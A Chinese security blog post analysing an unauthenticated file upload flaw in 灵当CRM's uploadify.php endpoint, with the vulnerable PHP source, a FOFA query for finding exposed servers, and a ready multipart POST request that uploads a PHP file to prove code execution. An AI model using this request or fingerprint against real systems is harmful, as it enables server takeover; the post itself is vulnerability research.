---
title: "灵当CRM /crm/uploaddify/uploadify.php 文件上传漏洞"
source: https://mrxn.net/jswz/51mis-uploaddify-uploadify-rce.html
asset_dir: assets/灵当crm-crmuploaddifyuploadify.php-文件上传漏洞
---

# 灵当CRM /crm/uploaddify/uploadify.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/20 08:12
* 1302浏览
* [0评论](#comment)
* 41分钟阅读

深入探索

SQL

服务器

application


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

灵当CRM是一款专为中小企业打造的智能[客户关系管理](#)工具，由上海灵当信息科技有限公司开发并运营。广泛应用于金融、教育、医疗、IT服务、房地产等多个行业领域，帮助企业实现客户个性化管理需求，提升企业竞争力。无论是新客户开拓、老客户维护，还是销售过程管理、服务管理等方面，灵当CRM都能提供全面、高效的解决方案。灵当CRM /crm/uploaddify/uploadify.php 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，未经身份验证的攻击者可通过该漏洞在服务器端写入后门，任执行意代码，获取服务器权限，进而控制整个 web 服务器。

客户关系管理

# 影响版本

# fofa语法

> `body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")`

# 漏洞分析

深入探索

网页浏览器

云安全解决方案

安全研究工具

直接看 /crm/uploaddify/uploadify.php 业务逻辑实现

```
<?php
    //文件夹名称

    error_reporting(E_ALL^E_NOTICE^E_WARNING);
    global $current_user;
    $myatt_id=$_POST['myatt_id'];
    $setype=$_POST['myatt_moduel'];
    if(!empty($myatt_id))
    {
        $filepath = 'storage/'.$setype.'/'.$myatt_id.'/';

        $targetFolder ="../$filepath";
        if(!file_exists('../storage/'.$setype))
        {
            mkdir('../storage/'.$setype,0777);
        }

       if(!file_exists($targetFolder))
       {
        mkdir($targetFolder,0777);
       }
    }
    else
    {
        $fyear=date("Y");
        $fmonth=date('F');
        $fday=date('j');//获取当前月份第几天
        $fweek='week'.ceil($fday/7);//获取当前日期所属月份的第几周
        if(!file_exists('../storage/'.$fyear))
        {
             mkdir('../storage/'.$fyear,0777);
        }
        if(!file_exists('../storage/'.$fyear.'/'.$fmonth))
        {
             mkdir('../storage/'.$fyear.'/'.$fmonth,0777);
        }
         if(!file_exists('../storage/'.$fyear.'/'.$fmonth.'/'.$fweek))
        {
             mkdir('../storage/'.$fyear.'/'.$fmonth.'/'.$fweek,0777);
        }
        $targetFolder='../storage/'.$fyear.'/'.$fmonth.'/'.$fweek.'/';
    }
    $verifyToken = $_POST['timestamp'];
    //if (!empty($_FILES) && $_POST['token'] == $verifyToken) {
    $tempFile = $_FILES['Filedata']['tmp_name'];
    $file_path = "../modules/Attachment/attachments.txt";
   $filehandle = fopen($file_path,"r");
   $filestring= fgets($filehandle);
   $fileTypes=explode(',',$filestring);

    fclose($filehandle);
    /**
       * date:20140612
       * reason:有空格将空格替换成“_”
       */
    $file_name=str_replace(" ","_",$_FILES['Filedata']['name']);  
    $fileParts = pathinfo($file_name);
   /**
   * edit:can
   * date:20140211
   * reason:新需求：上传文件名称在服务器不变；
   * edit:diony
   * date:20140612
   * reason:有空格将空格替换成“_”
   */ 
  $arr=array("ASCII","UTF-8","GB2312","GBK",'BIG-5');
  $encode=mb_detect_encoding($file_name, $arr); 
  if($encode=='UTF-8')
  {
    $targetFile=iconv('UTF-8','gbk',$file_name);
  }
  else
  {
     $targetFile=$file_name;
  }
  if(strtolower(PHP_OS)=='freebsd'||strtolower(PHP_OS)=='linux'||strtolower(PHP_OS)=='unix')
  {
    //获取系统类型，如果是非windows系统则不用修改编码格式
    $targetFile=$file_name;
  }

    if (in_array(strtolower($fileParts['extension']),$fileTypes)) {

            if(move_uploaded_file($tempFile,$targetFolder.$targetFile)){
                $path=$targetFolder; 
            //$arr=array('a'=>$targetFile,'b'=>$path); 
            //$data=json_encode($arr);
            echo $path."?"."$targetFile";
            }else{
                    echo '上传失败';
            }
    } else {
            echo '扩展名无效';
    }

?>
```

根据 myatt\_id 是否为空来生成文件储存目录

漏洞预警服务

如果 myatt\_moduel 不为空，则文件保存在 /crm/storage/myatt\_moduel值/myatt\_id值（如果有）/原始文件名

否则文件保存在 /crm/storage/2023/01/week1（第几周）/原始文件名

上传文件后缀根据 modules/Attachment/attachments.txt 来判断是否允许，允许的扩展如下

[![灵当CRM /crm/uploaddify/uploadify.php 文件上传漏洞](images/img-001-d767a31680be.webp)](https://image.mrxn.net/ece14ed37d6f48dcb24a64d240c48a5e.webp)

如果存在php、phtml类可执行文件后缀，则造成文件上传致RCE[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

文件类型验证与文件保存

1. 判断上传文件的扩展名是否在允许的扩展名数组中（以小写比较）。
2. 如果验证通过，则调用 move\_uploaded\_file 将文件从临时路径移动到目标文件夹中，并使用处理后的文件名保存。
3. 成功后，返回拼接后的字符串：目标文件夹路径 + "?" + 文件名。
4. 如果移动失败，则输出“上传失败”。
5. 如果文件扩展名不符合要求，则输出“扩展名无效”。

# 漏洞复现

```
POST /crm/uploaddify/uploadify.php HTTP/1.1
Host: 51mis.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="myatt_moduel";

1017
------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="myatt_id";

2024
------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="Filedata"; filename="test.php"
Content-Type: application/x-php

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundaryABC123--
```

[![灵当CRM /crm/uploaddify/uploadify.php 文件上传漏洞](images/img-002-85baa37e4a4a.webp)](https://image.mrxn.net/2dc8da49ef6a4a8bb41348f8314cd699.webp)

访问文件 /crm/storage/1017/2024/test.php

网络安全

[![灵当CRM /crm/uploaddify/uploadify.php 文件上传漏洞](images/img-003-d605defe7eb2.webp)](https://image.mrxn.net/5b043ca1cdd44a9b9b2b8bcdaed0f27f.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[灵当CRM /crm/uploaddify/uploadify.php 文件上传漏洞](https://mrxn.net/jswz/51mis-uploaddify-uploadify-rce.html)  
文章链接：<https://mrxn.net/jswz/51mis-uploaddify-uploadify-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/51mis-uploaddify-uploadify-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAL00lEQVR4Aeyai1rjyA6E+ef933lPykW15b44gYUke8Z8iJJKJXWn5SYwzJ+Pj49/vmv/fH7M6j9TQ+/wFVNfOfnhhYpl8quJe9TO6mqu91f9qy6ayn3H10Buddfnu5xAG8htwh+PWr/5WV00ySUGPsAWrkdwPrVCMBetOBmYhx2jOUOwPhr16i25HsG1Vd9rau6eX2vbQCp5+a87gWEg4OnDiKttgrU1D+bAmFx9WuCYA8fRpOYMoxWe6ZSTpjfxMvDa8mPRJv4OgvvCiLN+w0Bmoot73gn8yEDyJMH+FOQlJBcMLwwXFFcN1v3AuarvfThqwDHQpMD2nhYCHAOhtjzscRLAMhfNV/FHBvLVRS/9+gR+ZCDgJ6Uus3rqq6b3+5rEwmjhuBY4BiJZPrXqEwM2XSv6dJIXwlEDx/iz5EfhRwbyozv6y5v9zkD+8kP9Ny9/GIiu6spWC8300YKvORjDzxCsAWPVZI1wiWcYzSPY14PXBlp5r5nFTdw5M224TrqFw0A29vryshNoAwG2Nzm4j/1uwTWVB3NnTwNYU+vkpwacB0RPDWj77gV9nz5fY3Cf1AhrXj5YI18GjgGFBwPavuDcr4VtIJW8/NedwB89Cd+1ftuwPwnpeaZJDlyXGnCcvBBGTnxqhIpnppys5hTL4NgXHANNDmxPewhwrPpYcom/i9cNyUm+CX5pIOAnA4x5DXkaElcEa6OpGF24Pg5fMRpwXxjxK5raW35qhYqriZOFk98beD/hwTEQarttMMbAx5cG8nF9/PoJ/AG2iWUlcAwj5skIgjWpDS/sOThqkxeCc2AU1xs4p97Vqi58uFUsPhpwXzCGF8LIVR6chx2VXxlYlzw41n5i/6Ubktfxf43XQN5svMNAcnWCs/3C8apFA+aBUAMC27dIYMhlTaBpwH5yKYIjrzyY6zV9DIRqqHpZI4oDbPsJJZ0ssVCxTH41cbHKr/xhICvhxT/nBIaBwPFpmG1jNfHwwtSB+4nrLZoee53iXjOLpavWa2a5cDDuc1UP1vZ5xeknXwbWAu1/9Yhf2TCQlfDin3MC7Z9OwJPsJ5xYmC2BtX0M5oGkhqcC2L4fA4MGaDmg5eUAW05+NTAPVHrqA1sPoOWBjdPrk7VEccTLCrW54mLgPmDcBN0XcC41wSq7bkg9jTfw20AyLfAUz/YWbTSJK4L7gDHaitFXrvrgWqDRwPZEN6I4cMyd9YejFhzDjqkHc2WpzQXzwBbrS2rkyxJXFC8DttcCO7aBSHDZ60/gGsjrZ3DYQRsI+NrkakUF5mGNM224ILg+/YV9LrFyssRCxY8aeC3VyVInv7fkZgjukxw4To/wwnBw1IBjIJL2bSqE6mNtIEle+NoTaAPJhLIdYJtkeGFy8mWJYdQqL4tmhjCvi1b1sXDgmj4G87D/Agbmok2vismBtbBjdNE8gqkB90ksBHN9HzAPXH8P+Xizj+HvIWf705Rl4IlGK04G5mHHM01yYP0qDn8PtQcZPN4PjlrVx/r1VnzVgfudaZML1vr2LauSl/+6E2j/dJItgCfcx2Ae9u/Rswmn7jsIXuMrtdmDEFwvX9b3AedhR+lk0cKe67nEQRi16iUD56J9FK8b8uhJPUn3I+8h4KdBT0Ys+08Ma020wb4GSKohsP0UCDu25KeTPp/hAVa58EJw70PhLVCutxt9+Ewe3AM45FfBdUNWJ/Pv+G9XXwP59tH9TmEbCLB9C